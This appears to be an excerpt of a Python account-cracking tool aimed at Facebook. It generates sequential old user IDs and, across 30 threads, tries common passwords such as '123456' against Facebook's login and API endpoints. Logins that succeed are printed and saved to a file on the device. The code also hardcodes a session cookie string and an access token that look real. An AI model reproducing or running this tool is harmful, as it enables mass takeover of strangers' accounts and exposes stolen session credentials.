...
# --- COOKIES INTEGRATION ---
COOKIES = "datr=ImSBarYEMwqZeqCpBhA3ipgq;sb=ImSBaj6yNV7AjteDDMMq-bVC;m_pixel_ratio=2;wd=360x800;c_user=100002493741776;xs=41%3AOp1qw_pz-4IOPg%3A2%3A1786864727%3A-1%3A-1;fr=0iv46T4EiONvlHD7R.AWdgCod2nMxRWS92q404tmuFiLgNFEYqMywLW47-TpvjIBKfhuc.BqgWQi..AAA.0.0.BqgWRv.AWdMq04qxUbbiUiE9vBUsSf69EI;locale=en_US;pas=100002493741776%3A6I75vOBjyV;wl_cbv=v2%3Bclient_version%3A3250%3Btimestamp%3A1786864751;fbl_st=101530852%3BT%3A29781079;vpd=v1%3B688x360x2;"
...
def get_device_model():
    """Android Brand aur Model اکٹھا کرنے کا طریقہ"""
    try:
...
def show_branding():
    ...
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFEATURE    \x1b[38;5;46m▶  \033[1;97mOLD CLONING (COOKIES)")
...
def BNG_71_():
    ...
    linex()
    __Jihad__ = input(f"       \x1b[38;5;41mCHOICE  {W}: {Y}")
...
def old_One():
    ...
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 2 (COOKIE)')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
...
def old_Tow():
    ...
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD B (COOKIE)')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
...
def old_Tree():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37mOLD CODE {Y}:{G} 2009-2010")
    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37mTOTAL ID COUNT {Y}:{G} ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
    ...
    try:
        ...
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                ...
                'email': str(uid),
                'password': str(pw),
                'access_token': 'EAAGNO4a7r2wBSIi2nyPC3X7eqlHa6vZBVOm9kzDWSMgzdvqRrvIR1mZCpZBvtU3BhSbnVMoI7aiZAiPI95PZCQEchLZB3zs2EC5evnvx1kh6lyqA4ZBHjJTR6vhEHgZA5GgaPuStYpsx4KY1IYcqjHG57Et0FeuHCCnscdh2G0V9O5Tws9k11mO1fzgmKiiU27VG8gZDZD',
            ...
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч<\x1b[38;5;196m(\x1b[1;37mARMAN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
...
# --- UPDATED COOKIE-BASED METHOD ---
def login_2(uid):
    global loop
    session = requests.Session()
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m(\x1b[1;37mARMAN-COOKIE-M2\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    sys.stdout.flush()
    ...
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            ...
            url = "https://mbasic.facebook.com/login/device-based/login/?refsrc=deprecated&lwv=100"
            res = session.post(url, data=data, headers=headers)
            
            if 'c_user' in session.cookies.get_dict():
                print(f"\r\r\x1b[1;37m<\x1b[38;5;46m(ARMAN-COOKIE-OK) {uid} | {pw} | {creationyear(uid)}")
                open('/sdcard/ARMAN-COOKIES-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        except Exception:
            pass
